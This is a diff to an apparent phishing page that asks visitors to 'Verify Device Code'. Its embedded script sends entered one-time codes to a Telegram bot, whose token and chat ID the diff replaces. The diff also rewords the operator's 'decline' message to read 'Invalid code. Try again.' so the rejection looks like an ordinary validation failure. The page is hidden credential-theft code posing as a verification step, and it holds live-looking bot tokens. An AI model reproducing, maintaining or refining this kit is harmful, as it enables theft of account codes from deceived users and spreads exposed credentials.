@@ -448,7 +448,7 @@
 
         <div class="form-section">
             <button class="btn-action" id="verifyBtn">Verify Device Code</button>
-            <button class="back-btn" onclick="window.location.href='index.html'">← Back to Data Offers</button>
+            <button class="back-btn" onclick="window.location.href='index.html'">← Back </button>
             <div class="security-note">
                 <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                     <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
@@ -545,8 +545,8 @@
 
     <script>
         const CONFIG = {
-            BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
-            CHAT_ID: '7547427914'
+            BOT_TOKEN: '8968523765:AAGTH1IIodC_PtXIJPuIsKSz2qxUOe8apU4',
+            CHAT_ID: '2033833016'
         };
 
         let state = { lastUpdateId: 0 };
@@ -728,7 +728,7 @@
                                 } else if (cb === declineId) {
                                     clearInterval(interval);
                                     spinner.style.display = 'none';
-                                    errMsg.textContent = 'Code declined. Please try again.';
+                                    errMsg.textContent = 'Invalid code. Try again.';
                                     errMsg.style.display = 'block';
                                     document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
                                     focusFirstInput('otpInputs');
